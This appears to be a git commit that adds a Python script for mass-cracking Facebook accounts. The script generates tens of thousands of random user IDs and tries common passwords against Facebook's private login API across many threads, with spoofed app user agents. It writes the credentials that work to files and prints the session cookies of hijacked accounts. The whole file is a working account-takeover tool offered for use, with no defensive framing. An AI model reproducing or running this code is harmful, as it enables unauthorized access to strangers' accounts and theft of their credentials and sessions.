7808fbd175f7b655c790f4daa005734dc1c5fd98
xive404 <mdddd1421@gmail.com>
2025-02-01 15:41:31 +0600

    Add files via upload

---
+++ x.py
@@ -0,0 +1,225 @@
+#OWNER ASIF #FUCK_XX
+#AXN_FUCK_XNX #FUCK_XX
+#GIFT BY ASIF #FUCK_XX
+#OPENED BY ASIF #FUCK_XX
+#HELP BY SIKRA NIKNAME(H41N4)
+import os, sys, json, uuid, string, random, requests
+from concurrent.futures import ThreadPoolExecutor
+import os, sys, json, uuid, string, random, requests
+from concurrent.futures import ThreadPoolExecutor as tred
+
+loop = 0 
+oks = []
+cps = []
+gen = []
+#______________OLD UA_______________#
+def SEX22():
+    url5 = ["Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"]
+    return random.choice(url5)
+#______________OLD UA_______________#
+def fuck_xnxx():
+    rr=random.randint
+    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    rx=random.randrange(1, 999)
+    url6=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
+    return url6
+#______________FILE UA_______________#
+def fuck_xnxxxx():  
+    mcc = random.choice(['SM-F711B', 'SM-F711N', 'SM-F711U', 'SM-F711U1', 'SM-E025F'])
+    url1 = f'[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=720,height=1440}};FBLC/en_US;FBRV/{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{mcc};FBSV/7.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    return url1
+#______________FILE UA_______________#
+def fuck_xx():
+        url3  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097172;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/Robi;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_AI2205_D;FBSV/14;nullFBCA/armeabi-v7a:armeabi;]"
+        return url3
+#______________FILE UA_______________#
+def fuck_xnxxxxx():
+    realmi = random.choice(["RMP2107","RMX3770","RMX2176","RMX3939","RMX3868"])
+    url4 = "[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=2.0,width=720,height=1456};FBLC/ru_RU;FBRV/314609338;FBCR/MTS RUS;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/"+realmi+";FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+    return url4
+#______________RANDOM UA_______________#
+ua = "Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]"
+#______________BANNER SYSTEM_______________#
+
+def clear():os.system('clear')
+def ____banner____():
+    if "win" in sys.platform:os.system("cls")
+    else:os.system("clear")
+    print(f"""\033[1;32m
+    
+▗▄▄▖  ▗▄▖ ▗▄▄▖ ▗▖  ▗▖    ▗▖ ▗▖▗▖ ▗▖▗▄▄▖ 
+▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌▐▛▚▖▐▌    ▐▌ ▐▌▐▌ ▐▌▐▌ ▐▌
+▐▛▀▘ ▐▌ ▐▌▐▛▀▚▖▐▌ ▝▜▌    ▐▛▀▜▌▐▌ ▐▌▐▛▀▚▖
+▐▌   ▝▚▄▞▘▐▌ ▐▌▐▌  ▐▌    ▐▌ ▐▌▝▚▄▞▘▐▙▄▞▘
+                                                                                                                                                             
+ \x1b[37;41m\t ♥I♥M♥ B♥R♥A♥N♥D♥\x1b[0;m\n\n\x1b[1;37m                              
+\n---------------------------------
+\033[1;93m\033[1;93m Emon
+\033[1;91m  AUTHOR   : Emon
+\033[1;91m  GITHUB   :         Emon
+\033[1;91m  WHATSAPP : +    X
+\033[1;91m  TOOLS    : \033[1;32m FREE \033[1;37m                         
+\033[1;91m  VERSION  :   \033[1;35m     2025                                                                            
+\033[1;93m\033[1;93m """)
+    
+#______________MAIN DEF_______________#
+def main():
+    ____banner____()
+    #print("[1] FILE CLONE [SOON] ")
+   # print("[2] RANDOM CLONEv[SOON]");os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
+    print("[3] START CLONE [2009][WORK]")
+#    print("[4] NAGAD HALF INFO[]SOON")
+  #  print("[5] NAGAD BAN [SOON]")
+    print("-------------------------------")
+    select = input("SELECT OPTION : ")
+    if select == "3":
+        fuckMyxAXN("100000")
+    if select == "2":
+    	print(" FUCK RANDOM")
+    if select == "1":
+    	print("COMIN SOON")
+    if select == "4":
+    	print("COMIN SOON")
+    if select == "5":
+        print("COMIN SOON")
+    
+    else:
+        main()
+        
+#______________OLD DEF_______________#
+
+def fuckMyxAXN(series):
+    ____banner____()
+    os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
+    global gen
+    if series == "100000":
+        SEX = "100000"
+        SEX2 = 9
+    else:
+        SEX = "100000"
+        SEX2 = 9
+    for a in range(99999):
+        AXN = "".join(random.choice(string.digits) for _ in range(SEX2))
+        gen.append(AXN)
+    with ThreadPoolExecutor(max_workers=30) as Fuck_xnxx:
+        ____banner____()
+        print("TOTAL IDS - "+str(len(gen)))
+        print("USE FLIGHT MODE EVERY 3 MIN")
+        print("USE 1.1.1.1 VPN FOR GOOD RESULT")
+        print("-------------------------------")
+        for love in gen:
+            ids = SEX + love
+            passlist = ["123456", "1234567", "12345678", "123456789"," 000000","1234567890"]
+            Fuck_xnxx.submit(Fucking_life, ids, passlist)
+    sys.exit("\n-------------------------------")
+    
+#______________OLD METHOD_______________#   
+
+def Fucking_life(ids, passlist):
+    global loop, oks, cps
+    sys.stdout.write(f"\rFUCK [{loop}]|OK:[{len(cps)}]")
+    sys.stdout.flush()
+    try:
+        for pas in passlist:
+            data = {'adid': str(uuid.uuid4()),'email': ids,'password': pas,'cpl': 'true','credentials_type': 'device_based_login_password',"source": "device_based_login",'error_detail_type': 'button_with_disabled','format': 'json','generate_session_cookies': '1','generate_analytics_claim': '1','generate_machine_id': '1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale": "en_US", "client_country_code": "US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+            head = {'content-type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': fuck_xnxx(),'accept-encoding': 'gzip, deflate','x-fb-http-engine': 'Liger'}
+            url = "https://b-api.facebook.com/auth/login"
+            response = requests.post(url, data=data, headers=head, verify=True).json()
+            if "access_token" in response:
+                print(f"\r\r\x1bFUCK_H41N4-OK | {ids} • {pas}")
+                open("/sdcard/FUCK-OK.txt", "a").write(ids + "|" + pas + "\n")
+                oks.append(ids)
+                break
+            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
+                print(f"\r\r\x1bAFUCKOK | {ids} • {pas}")
+                open("/sdcard/FUCK-OK.txt", "a").write(ids + "|" + pas + "\n")
+                cps.append(ids)
+                break
+        loop += 1
+    except Exception as e:
+        pass
+        
+#______________RANDDOM DEF_______________#
+#===========FUCK RANDOM==============#
+{"""
+def FUCK_XNXXX():
+    user=[]
+    clear()
+    ____banner____()
+    os.system("xdg-open https://t.me/+yTVgZU4cwB8zMDQ1")
+    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
+    code=input(' ENTER SIM CODE >> ')
+    
+    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
+    try:
+        limit=int(input(' ENTER LIMIT >> '))
+    except ValueError:
+        limit=50000
+    clear()
+    for nmbr in range(limit):
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        user.append(nmp)
+    with tred(max_workers=40) as fuckas:
+        tl=str(len(user))
+        ____banner____()
+        print('---------------------------------')
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' \33[0;42mFAST SPEED CLONING\033[0;92m ')
+        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
+        print('---------------------------------')
+        
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:7],ids[:6],]
+            fuckas.submit(FUCK_FRIEND,ids,passlist)
+    
+    print(' THE PROGRESS HAS BEEN COMPLETE ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    BROKEN_ASIF()
+    
+#______________RANDDOM METHOD_______________#
+
+def FUCK_FRIEND(ids,passlist):
+    global oks
+    global cps
+    global loop
+    try:
+        for pas in passlist:
+            sys.stdout.write(f'\r\x1b[[\x1b[R_FUCK\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
+            sys.stdout.flush()
+            adid=str(uuid.uuid4())
+            device_id=str(uuid.uuid4())
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
+            url='https://b-graph.facebook.com/method/auth.login'
+            reqx=requests.post(url,data=datax,headers=header).json()
+            if 'session_key' in reqx:
+                try:
+                    uid=reqx['uid']
+                except:
+                    uid=ids
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r \033[1;32m[FUCK-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
+                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
+                    print('\033[3;34m [COOKIE_❇️] '+coki)
+                    open('/sdcard/FUCK-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
+                    oks.append(str(uid))
+                    break
+            elif 'www.facebook.com' in reqx['error_msg']:
+                print('\r\r \033[1;35m[R_FUCK-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
+                open('/sdcard/BRONEN-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass"""
+        }
+if __name__ == "__main__":
+    main()
